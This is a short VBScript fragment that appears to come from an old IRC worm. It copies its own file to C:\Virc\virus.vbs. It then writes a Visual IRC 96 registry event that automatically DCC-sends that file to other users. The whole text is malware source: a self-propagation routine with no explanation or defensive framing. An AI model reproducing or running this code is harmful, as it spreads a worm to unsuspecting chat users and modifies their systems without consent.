gh.CopyFile Wscript.ScriptFullName, "C:\Virc\virus.vbs", True
gh.RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\virus.vbs"

